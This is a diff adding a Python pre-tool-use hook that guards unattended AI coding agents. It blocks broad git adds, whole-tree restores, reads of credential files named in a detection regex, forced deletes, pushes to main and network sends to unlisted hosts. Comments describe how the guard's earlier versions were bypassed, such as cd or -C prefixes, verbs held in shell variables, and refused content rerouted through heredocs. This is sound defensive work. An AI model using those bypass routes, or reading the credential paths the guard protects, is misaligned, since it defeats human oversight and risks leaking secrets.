+# `-A`), or a combined short-flag cluster that includes `A` (`-Av`, `-fA`,
+# …), with NO other pathspec token present. `git add -A <paths>` is
+# explicitly allowed; git add's own semantics make that combination
+# redundant, but redundant is not broad.
+#
+# Captures the segment between `git` and `add` (group 1, may hold `-C <dir>`)
+# separately from the segment after `add` (group 2, the add arguments) — a
+# second Opus re-review (2026-09-24) required resolving `git -C <dir> add`'s
+# own directory, not just the session cwd.
+_GIT_ADD = re.compile(r"\bgit\s+([^|;&\n]*?)\badd\b([^|;&\n]*)")
+
+# A combined short-flag cluster: a single dash followed by one or more
+# single-letter flags with no `=` and no second leading dash — `-Av`, `-fA`,
+# `-vfA` are all this shape; `--all` and `-A` alone are handled as exact
+# tokens above. Bare `-` and long options (`--foo`) never match.
+_SHORT_FLAG_CLUSTER = re.compile(r"^-[A-Za-z]{2,}$")
+
+
+def _bare_broad_add(argtext):
+    """True when argtext's only pathspec-shaped tokens are -A/--all/bare '.'/
+    the ':/' pathspec-magic form, or a combined short-flag cluster containing
+    'A', and nothing else names a path. Flags other than -A/--all (or a
+    cluster containing A) are ignored (git add -v -A is still bare); any
+    other non-flag token is a real pathspec and clears the call."""
+    try:
+        tokens = shlex.split(argtext)
+    except ValueError:
+        return False
+    broad_seen = False
+    for tok in tokens:
+        if tok in ("-A", "--all", ".", ":/"):
+            broad_seen = True
+            continue
+        if _SHORT_FLAG_CLUSTER.match(tok):
+            if "A" in tok[1:]:
+                broad_seen = True
+            continue
+        if tok.startswith("-"):
+            continue
+        return False       # any other bare token is a real pathspec
+    return broad_seen
+
+
+def _in_carr_tree(cwd):
+    """cwd is the canonical carr-system checkout or a path under it (which is
+    where this repo's worktrees live, per bin/worktree.sh convention) —
+    same shape as the functions.exec cwd scoping a few lines below in
+    main()."""
+    if not cwd:
+        return False
+    try:
+        real_cwd = os.path.realpath(os.path.expanduser(cwd))
+    except Exception:
+        return False
+    return real_cwd == REPO or real_cwd.startswith(REPO + os.sep)
+
+
+def _strip_matched_quotes(tok):
+    if len(tok) >= 2 and tok[0] == tok[-1] and tok[0] in ("'", '"'):
+        return tok[1:-1]
+    return tok
+
+
+# A single leading `cd <dir> &&` or `cd <dir>;` — not a general shell
+# interpreter, just the one shape the reported false positives/bypasses were
+# built from (`cd /tmp/x && git add -A` from a carr cwd; `cd ~/carr-system &&
+# git add -A` from /tmp). Anything more elaborate (a second cd, a subshell,
+# `cd "$(...)"`) is out of scope, same as the other reported gaps below.
+_LEADING_CD = re.compile(r"^\s*cd\s+(\"[^\"]*\"|'[^']*'|\S+)\s*(?:&&|;)\s*")
+
+
+def _leading_cd_dir(cmd):
+    """Return the directory named by a single leading `cd <dir> &&`/`;`, or
+    None. Operates on the raw command: this is the command's own structure,
+    not prose inside a quote, so it is read before strip_inert_text runs."""
+    m = _LEADING_CD.match(cmd)
+    if not m:
+        return None
+    return _strip_matched_quotes(m.group(1))
+
+
+def _git_dash_c_dir(pre_add_argtext):
+    """Return the directory named by a `-C <dir>` (or `-C<dir>`) flag found
+    before `add` in the same git invocation, or None. `git -C <dir> add ...`
+    runs against <dir>, not the process cwd — ignoring it both denies
+    legitimate use from elsewhere (`git -C /tmp/x add -A` sent from a carr
+    cwd) and misses a real bypass (`git -C ~/carr-system add -A` sent from
+    /tmp)."""
+    try:
+        tokens = shlex.split(pre_add_argtext)
+    except ValueError:
+        return None
+    i = 0
+    while i < len(tokens):
+        tok = tokens[i]
+        if tok == "-C":
+            return tokens[i + 1] if i + 1 < len(tokens) else None
+        if tok.startswith("-C") and len(tok) > 2 and not tok.startswith("--"):
+            return tok[2:]
+        i += 1
+    return None
+
+
+def _resolve_dir(candidate, base):
+    """Resolve `candidate` (from a leading cd or a -C flag) against `base`,
+    the same way a shell would resolve a relative directory argument against
+    the current directory."""
+    expanded = os.path.expanduser(candidate)
+    if os.path.isabs(expanded):
+        return expanded
+    return os.path.join(base, expanded)
+
+
+def broad_add_reason(cmd, cwd=None):
+    """Return a reason string to deny a bare `git add -A`/`--all`/`.`/`:/`
+    with no pathspec, scoped to the carr-system tree; None otherwise. Text
+    inside quotes, heredocs, or a grep/echo argument is never matched for the
+    add-arguments scan: it runs against strip_inert_text(cmd), the same
+    inert-text stripper every other quote-safe rule in this file uses, not
+    the raw command. The EFFECTIVE directory for the carr-tree scope check is
+    resolved from a leading `cd <dir> &&`/`;` and/or a `-C <dir>` flag on the
+    git invocation itself, not just the session's reported cwd — see
+    _leading_cd_dir / _git_dash_c_dir."""
+    session_cwd = cwd if cwd is not None else os.getcwd()
+    leading_cd = _leading_cd_dir(cmd)
+    base_cwd = _resolve_dir(leading_cd, session_cwd) if leading_cd else session_cwd
+    scanned = strip_inert_text(cmd)
+    for m in _GIT_ADD.finditer(scanned):
+        pre_add, post_add = m.group(1), m.group(2)
+        if not _bare_broad_add(post_add):
+            continue
+        c_dir = _git_dash_c_dir(pre_add)
+        effective_cwd = _resolve_dir(c_dir, base_cwd) if c_dir else base_cwd
+        if _in_carr_tree(effective_cwd):
+            return ("broad add (-A/--all/./:/) — blocked by the CARR unattended guard. "
+                    "Add explicit paths instead: `git add <path> [<path>...]`.")
+    return None
+
+
+def source_restore_reason(cmd, cwd=None):
+    """Compare whole-tree checkout/restore effects with HEAD before execution."""
+    from cmd_text import shell_tokens, shell_operands, SHELL_BOUNDARIES
+    try:
+        tokens, _ = shell_operands(shell_tokens(strip_inert_text(cmd)))
+    except ValueError:
+        return None
+    base = cwd or os.getcwd()
+    segments, words = [], []
+    for token in tokens + [';']:
+        if token in SHELL_BOUNDARIES:
+            if words:
+                segments.append(words)
+            words = []
+        else:
+            words.append(token)
+    for words in segments:
+        if words[0] == 'cd' and len(words) == 2:
+            base = _resolve_dir(words[1], base)
+            continue
+        if os.path.basename(words[0]) != 'git':
+            continue
+        directory = base
+        i = 1
+        while i < len(words):
+            if words[i] == '-C' and i + 1 < len(words):
+                directory = _resolve_dir(words[i + 1], directory)
+                i += 2
+            elif words[i].startswith('-C') and len(words[i]) > 2:
+                directory = _resolve_dir(words[i][2:], directory)
+                i += 1
+            else:
+                break
+        if i >= len(words) or words[i] not in {'checkout', 'restore'}:
+            continue
+        operation, args = words[i], words[i + 1:]
+        revision, paths = None, []
+        if operation == 'checkout':
+            if '--' not in args:
+                continue
+            split = args.index('--')
+            before = args[:split]
+            if any(arg in {'-b', '-B', '--orphan'} for arg in before):
+                continue
+            revisions = [arg for arg in before if not arg.startswith('-')]
+            if len(revisions) != 1:
+                continue
+            revision, paths = revisions[0], args[split + 1:]
+        else:
+            j = 0
+            while j < len(args):
+                arg = args[j]
+                if arg == '--':
+                    paths.extend(args[j + 1:])
+                    break
+                if arg in {'-s', '--source'} and j + 1 < len(args):
+                    revision = args[j + 1]
+                    j += 2
+                    continue
+                if arg.startswith('--source='):
+                    revision = arg.split('=', 1)[1]
+                elif not arg.startswith('-'):
+                    paths.append(arg)
+                j += 1
+        if not revision or any('$' in value or '`' in value for value in [directory, revision, *paths]):
+            continue
+        def git_read(*arguments):
+            return subprocess.check_output(
+                ['git', '-C', directory, *arguments], stderr=subprocess.DEVNULL,
+                timeout=2)
+        try:
+            root = git_read('rev-parse', '--show-toplevel').decode().strip()
+            whole_tree = any(path in {':/', ':(top)', ':(top).', '*'} or
+                             os.path.realpath(_resolve_dir(path, directory)) == os.path.realpath(root)
+                             for path in paths)
+            if not whole_tree:
+                continue
+            tree = git_read('rev-parse', '--verify', '--end-of-options', revision + '^{tree}').decode().strip()
+            changed = git_read('diff', '--no-ext-diff', '--name-only', '-z', 'HEAD', tree, '--', *paths)
+        except (OSError, subprocess.SubprocessError):
+            continue  # invalid Git requests fail in Git; preserve this guard's fail-open policy
+        if changed:
+            names = [path.decode('utf-8', errors='replace') for path in changed.split(b'\0') if path]
+            return ('whole-tree source replacement from ' + revision + ' changes tracked paths: '
+                    + json.dumps(names, ensure_ascii=False) + '. Use an explicit owned-path restore: '
+                    'git checkout <revision> -- <owned-path> [<owned-path>...]. '
+                    'Intentional destructive restores keep the existing destructive-action route.')
+    return None
+
+
+def check(cmd, cwd=None):
+    """Return a reason string to block, or None to allow."""
+    if cmd.strip() in ALLOW_EXACT:
+        return None
+
+    executable = strip_inert_text(cmd)
+    # Claude native Read rules cover direct file tools. Command-sensitive reads
+    # stay here for Codex and shell wrappers without blocking reviewed readers.
+    invocations = list(executed_invocations(executable))
+    for program, arguments in invocations:
+        if program in {'cat', 'head', 'tail', 'less', 'more', 'sed', 'awk', 'grep', 'rg', 'cp', 'source', '.'}:
+            paths = [word for word in arguments if not word.startswith('-')]
+            if program in {'sed', 'awk', 'grep', 'rg'}:
+                paths = paths[1:]
+            sensitive = re.compile(
+                r'(?:^|/)(?:\.env(?:\.[^/]*)?|credentials(?:\.json)?|tokens?\.json|'
+                r'id_(?:rsa|ed25519|ecdsa|dsa)(?!\.pub)|age-key[^/]*|identity\.txt)$')
+            if any(sensitive.search(word) or word.endswith(('.pem', '.p12'))
+                   or ('/.config/carr/' in word and word.endswith('.env'))
+                   or '/Keychains/' in word for word in paths):
+                return 'credential path read — use the credential broker'
+        if program == 'rm' and any(word in {'--recursive', '--force'} for word in arguments):
+            if not in_safe_zone(executable):
+                return 'recursive/forced delete — blocked by the CARR unattended guard'
+        if program == 'git':
+            words = list(arguments)
+            while words and words[0] in {'-C', '-c', '--git-dir', '--work-tree'}:
+                words = words[2:]
+            if words[:1] == ['push'] and any(
+                    word.split(':')[-1].removeprefix('refs/heads/') in {'main', 'master'}
+                    for word in words[1:] if not word.startswith('-')):
+                return 'direct push to main — use the branch and pull-request delivery path'
+    reason = source_restore_reason(cmd, cwd)
+    if reason:
+        return reason
+
+    reason = broad_add_reason(cmd, cwd)
+    if reason:
+        return reason
+
+
+    reason = direct_metered_dispatch(cmd) or github_poll_reason(cmd)
+    if reason:
+        return reason
+
+    for pat, label in RULES:
+        programs = {'recursive/forced delete': {'rm', 'find'},
+                    'secure delete': {'shred', 'srm'},
+                    'force push': {'git'}, 'hard reset': {'git'},
+                    'history rewrite': {'git'}, 'forced clean': {'git'}}.get(label)
+        if programs and not any(program in programs for program, _ in invocations):
+            continue
+        if pat.search(cmd):
+            # Destructive-fs rules are waived inside the sanctioned scratch zones.
+            if label in ("recursive/forced delete", "secure delete") and in_safe_zone(cmd):
+                continue
+            # Rebasing your OWN branch in place is repair, not history loss —
+            # and refusing it is what produced 35 orphan branches. Narrow by
+            # design: lease spelling, named ref, never main. See the function.
+            if label == "force push" and force_push_to_named_side_branch(cmd):
+                continue
+            # A SQL keyword sitting in PROSE is not a database operation (loop #240).
+            # The patterns stay exactly as strict; they are simply consulted only when
+            # the command could reach a database at all.
+            if label in SQL_LABELS and not is_sql_context(cmd):
+                continue
+            # Prose ABOUT a destructive command is documentation. Consulted
+            # only for the command-shaped labels, and only when the pattern is
+            # absent from the executable remainder — so anything outside a
+            # quoted prose flag or a heredoc body is still scanned exactly as
+            # before. See PROSE_SAFE_LABELS for what is deliberately excluded.
+            if label in PROSE_SAFE_LABELS and not pat.search(strip_inert_text(cmd)):
+                continue
+            return f"{label} — blocked by the CARR unattended guard"
+
+    if is_send_context(cmd):
+        # host_allowlisted covers KNOWN_HOSTS plus the record-derived client and
+        # lead domains. An unlisted host is still reachable by a PLAIN READ-ONLY
+        # FETCH (see read_only_fetch_refusal): Joe's 2026-10-07 ruling that
+        # research may use the whole internet. Anything that sends stays
+        # allowlist-only, by design.
+        unlisted = [h for h in hosts_in(cmd) if not host_allowlisted(h)]
+        if unlisted:
+            why = read_only_fetch_refusal(cmd)
+            if why is not None:
+                return (f"network send to an unrecognised host ({unlisted[0]}) — blocked by the "
+                        f"CARR unattended guard: {why}. A plain curl/wget GET or download "
+                        f"(no body, upload, header, cookie, credential or $-expansion) may reach "
+                        f"any public host, spelled `curl -q ...` or `wget --no-config --no-netrc ...`, "
+                        f"with no cd; it may write a file only with `curl -q -g -o <path>` or "
+                        f"`wget ... -O <path>` where <path> is a new file named by a literal absolute "
+                        f"path under {FETCH_SCRATCH_ROOT} (no glob, ~, $, # or '..', no symlink, not in "
+                        f"a repository); a command that SENDS data needs the host in KNOWN_HOSTS.")
+
+    reason = render_write_target(cmd)
+    if reason:
+        return reason
+    reason = corpus_render_write_target(cmd)
+    if reason:
+        return reason
+    reason = vault_md_write_target(cmd)
+    if reason:
+        return reason
+    return None
+
+
+sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+from lib.hook_runtime import decision, run
+
+
+def _parse_error(exc):
+    log(f"ALLOW(parse-error) {exc}")
+    return 0
+
+
+def _decision_error(exc):
+    log(f"ALLOW(internal-error) {exc}")
+    return 0
+
+
+@decision(on_error=_decision_error)
+def decide(payload):
+    tool = payload.get("tool_name") or payload.get("toolName") or ""
+    ti = payload.get("tool_input") or payload.get("toolInput") or {}
+
+    # [2026-08-06, loop #163 closed on Joe's "Fix both now"] WebFetch joins
+    # the egress allowlist. Before this, `if tool != "Bash": sys.exit(0)`
+    # meant WebFetch reached ANY host while the identical curl was blocked —
+    # demonstrated live on 2026-08-03. Same KNOWN_HOSTS list, same tuning
+    # path (a block names the host to add). WebSearch is deliberately NOT
+    # gated: it reaches a search API, not an arbitrary host. Requires the
+    # settings matcher to include WebFetch — changed the same sitting.
+    if tool == "WebFetch":
+        url = (ti.get("url", "") if isinstance(ti, dict) else "") or ""
+        # urlsplit, not URL_RE, for the fetch path. The regex host class
+        # excludes ':' and '@', so `https://user:pass@evil.com/` captures
+        # "user" as the host — harmless while everything was deny-by-default,
+        # actively wrong now that a host can pass on policy rather than on a
+        # list. The Bash path below still uses URL_RE (it scans free text,
+        # where a parser has no single URL to parse).
+        try:
+            _p = urlsplit(url if url.startswith(("http://", "https://")) else f"https://{url}")
+            host = (_p.hostname or "").lower()
+        except Exception:
+            host = ""
+        if host and not host_allowlisted(host):
+            # Not on the list — fall through to the wider READ-ONLY class
+            # rather than refusing outright. This is the 2026-08-09 split:
+            # an allowlisted host keeps its unconditional pass, and anything
+            # else must satisfy the open-read policy instead.
+            reason = webfetch_open_read_reason(url)
+            if reason:
+                log(f"DENY {reason} :: {url[:200]}")
+                print(reason, file=sys.stderr)
+                sys.exit(2)
+            log(f"ALLOW(open-read) {host} :: {url[:200]}")
+        sys.exit(0)
+
+    # Codex may expose the outer functions.exec wrapper or its nested
+    # exec_command. Apply the same shell policy to the literal command.
+    native_wrapper = tool == 'functions.exec'
+    if tool in {"functions.exec", "exec_command"}:
+        # The native Bash guard pre-dates Codex and is intentionally global.
+        # This new Codex alias is CARR-only so it cannot change Life AI or
+        # another repository's workflow merely because they share Codex.
+        cwd = ((ti.get("workdir") or payload.get("cwd") or "")
+               if isinstance(ti, dict) else (payload.get("cwd") or ""))
+        try:
+            real_cwd = os.path.realpath(os.path.expanduser(cwd))
+        except Exception:
+            real_cwd = ""
+        if not (real_cwd == REPO or real_cwd.startswith(REPO + os.sep)
+                or "/CARR AI" in real_cwd):
+            # A task rooted elsewhere can still target CARR by absolute
+            # path.  Scope by the target too, otherwise a non-CARR cwd is
+            # an accidental bypass for the very files this guard protects.
+            raw = (ti if isinstance(ti, str) else
+                   ((ti.get("cmd") or ti.get("code") or "")
+                    if isinstance(ti, dict) else ""))
+            if REPO not in raw and not raw_targets_carr(raw):
+                reason = source_restore_reason(raw, cwd)
+                if reason:
+                    log(f"DENY {reason} :: {raw[:300]}")
+                    print(reason, file=sys.stderr)
+                    sys.exit(2)
+                sys.exit(0)
+        tool = "Bash"
+    if tool != "Bash":
+        sys.exit(0)
+    # Codex's local-function tool passes freeform JavaScript as a string;
+    # its embedded exec_command({cmd: ...}) must receive the same command
+    # inspection as a native Bash call. A dict remains the Claude shape.
+    cmd = (ti.get("command") or ti.get("cmd") or "") if isinstance(ti, dict) else ti
+    if not isinstance(cmd, str):
+        cmd = ""
+    if not cmd:
+        sys.exit(0)
+    if native_wrapper and 'exec_command' in cmd:
+        from lib.native_shell import native_commands, UninspectableCommand
+        try:
+            cmd = native_commands(cmd)
+        except UninspectableCommand as exc:
+            print(f'Cannot inspect native shell command: {exc} Use a literal exec_command cmd.', file=sys.stderr)
+            sys.exit(2)
+
+    # Effective cwd for the broad-add repo scope: the tool_input's own
+    # workdir (Codex), else the payload's cwd (Claude Code sends this for
+    # every Bash call), else this process's own cwd as a last resort.
+    effective_cwd = (
+        (ti.get("workdir") if isinstance(ti, dict) else None)
+        or payload.get("cwd") or os.getcwd())
+
+    reason = check(cmd, effective_cwd)
+
+    # BYPASS AUDIT C33/C34 (2026-09-24), REDESIGNED (2026-09-24, Opus
+    # review). This hook used to re-run the four client verb gates
+    # client-side against a parsed `./run.sh call <verb> '<json>'`
+    # command (hooks/verb_gate_recheck.py, now deleted). A replay of
+    # 12,145 real Bash commands found the shell-text side of that
+    # approach fundamentally leaky — 62 legitimate commands
+    # would have been falsely denied (`git add -A <paths>`, a grep for
+    # the pattern text, fixture repos in /tmp…), and several trivial
+    # bypasses (a shell variable holding the verb, `$(cat f)` JSON,
+    # calling tools/call-verb.py or mcp-server/local-verb.mjs directly)
+    # could never be closed from Bash-command-text at all — every one of
+    # those doors recurses through the SAME server-side callTool(), so
+    # the checks now live in the verb handlers themselves
+    # (mcp-server/src/verb-gate-checks.js, wired into add-loop's handler
+    # in tools.js) and this hook no longer duplicates them. Hosted CI stops a local-hook bypass
+    # from reaching main, which is the other reason a client-side
+    # regex recheck was the wrong enforcement point.
+
+    # THE SHELL HALF OF rule 76a53dfe. A record refused at the vault must not
+    # simply be written somewhere the gate does not look, and a heredoc into
+    # a scratchpad was exactly that path. One shared memory with
+    # record-home-gate.py, so a record refused through either door is
+    # recognised at the other (rule a8c55a47: two doors, one module).
+    session = payload.get("session_id") or payload.get("sessionId") or ""
+    body = heredoc_body(cmd)
+    if reason and "vault markdown" in reason:
+        remember_refusal(body or cmd, session)
+    elif not reason and body:
+        hidden, share = was_refused(body, session)
+        if hidden:
+            log(f"DENY re-routed refused content ({share:.2f})")
+            print(REFUSAL.format(pct=round(share * 100)), file=sys.stderr)
+            sys.exit(2)
+
+    if reason:
+        log(f"DENY {reason} :: {cmd[:300]}")
+        # EXIT 2, NOT JSON, AND THE CHOICE MATTERS. The structured contract
+        # (exit 0 + hookSpecificOutput.permissionDecision) is richer, but it
+        # requires exit 0 — so on any build that does not parse the JSON, exit
+        # 0 reads as ALLOW and the gate fails open silently. Exit 2 blocks on
+        # every build and hands stderr back to the session as the reason. For
+        # a guard, degrading toward "blocked" beats degrading toward "allowed".
+        print(reason, file=sys.stderr)
+        sys.exit(2)
+    sys.exit(0)
+
+
+def main():
+    sys.exit(run(decide, parse_error=_parse_error))
+
+
+if __name__ == "__main__":
+    sys.exit(main())
